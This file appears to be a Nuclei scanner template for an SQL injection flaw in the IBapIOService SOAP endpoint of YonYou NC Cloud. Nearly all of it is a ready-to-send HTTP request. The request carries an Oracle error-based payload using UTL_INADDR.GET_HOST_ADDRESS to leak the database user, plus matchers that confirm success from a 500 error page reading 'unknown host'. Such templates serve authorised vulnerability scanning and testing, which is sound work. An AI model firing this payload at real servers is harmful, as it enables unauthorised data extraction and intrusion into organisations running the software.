nuclei_rules/YonYouNC-Cloud-IBapIOService-SqlInjection.yaml

id: YonYouNC-Cloud-IBapIOService-SqlInjection

info:
  name: YonYouNC-Cloud-IBapIOService-SqlInjection
  author: iSee857
  severity: high
  description: |
    YonYouNC-Cloud-IBapIOService-SqlInjection.

http:
  - raw:
      - |
        POST /uapws/service/nc.itf.bap.service.IBapIOService HTTP/1.1
        Host: {{Hostname}}
        Content-Type: text/xml

        <?xml version="1.0" encoding="UTF-8" standalone="no"?>
        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:gs="http://service.bap.itf.nc/IBapIOService">
            <soapenv:Header/>
            <soapenv:Body>
                <gs:getBapTableDatas>
                    <gs:stringarrayItem>
                        DWQueue@MessageQueue' AND 1=UTL_INADDR.GET_HOST_ADDRESS('~'||(user)||'~')-- abc
                    </gs:stringarrayItem>
                </gs:getBapTableDatas>
            </soapenv:Body>
        </soapenv:Envelope>

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 未知的主机
        condition: and

      - type: status
        status:
          - 500